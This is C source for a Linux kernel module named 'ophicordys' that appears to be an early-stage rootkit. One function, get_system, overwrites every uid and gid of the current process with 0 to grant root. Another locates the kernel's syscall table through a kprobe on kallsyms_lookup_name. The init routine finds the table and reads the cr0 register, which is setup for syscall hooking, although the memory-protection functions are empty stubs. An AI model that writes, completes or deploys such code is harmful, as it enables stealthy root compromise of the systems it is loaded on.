#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/proc_ns.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/fdtable.h>
#include <linux/kprobes.h>

MODULE_AUTHOR("B1TC0R3");
MODULE_DESCRIPTION("Example LKM");
MODULE_LICENSE("GPL");

#define KPROBE_LOOKUP 1
#define DEBUG

int get_system(void);
unsigned long* get_syscall_table(void);
int set_memory_rw(unsigned long cr0);
int set_memory_ro(unsigned long cr0);

typedef unsigned long (*kln_func_t)(const char* name);

static struct kprobe probe = {
    .symbol_name = "kallsyms_lookup_name"
};

int get_system(void) {
    struct task_struct *current_task = get_current();
    struct cred* credentials = prepare_creds();
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    if (current_task == NULL || credentials == NULL) {
        return -1;
    }

    credentials->uid   = kuid;
    credentials->euid  = kuid;
    credentials->suid  = kuid;
    credentials->fsuid = kuid;

    credentials->gid   = kgid;
    credentials->egid  = kgid;
    credentials->sgid  = kgid;
    credentials->fsgid = kgid;

    commit_creds(credentials);
    return 0;
}

unsigned long* get_syscall_table(void) {
    unsigned long* syscall_table;

    register_kprobe(&probe);
    kln_func_t kallsyms_lookup_name = (kln_func_t) probe.addr;
    unregister_kprobe(&probe);

    syscall_table = (unsigned long*) kallsyms_lookup_name("sys_call_table");

    return syscall_table;
}

int set_memory_rw(unsigned long cr0) { return 0; }

int set_memory_ro(unsigned long cr0) { return 0; }

static int __init ophicordys_init(void) {
    #ifdef DEBUG
    int pid = task_pid_nr(current);
    printk(KERN_INFO "%s: module loaded (PID: %i).\n", THIS_MODULE->name, pid);
    #endif

    unsigned long* syscall_table = get_syscall_table();

    if (syscall_table == NULL)
        return -1;

    #ifdef DEBUG
    printk(KERN_INFO "%s: syscall table located at: %lx\n", THIS_MODULE->name, *syscall_table);
    #endif

    unsigned long cr0 = read_cr0();

    #ifdef DEBUG
    printk(KERN_INFO "%s: identified cr0: %lx\n", THIS_MODULE->name, cr0);
    #endif

    return 0;
}

static void __exit ophicordys_exit(void) {
    #ifdef DEBUG
    printk(KERN_INFO "%s: module unloaded.\n", THIS_MODULE->name);
    #endif
}

module_init(ophicordys_init);
module_exit(ophicordys_exit);
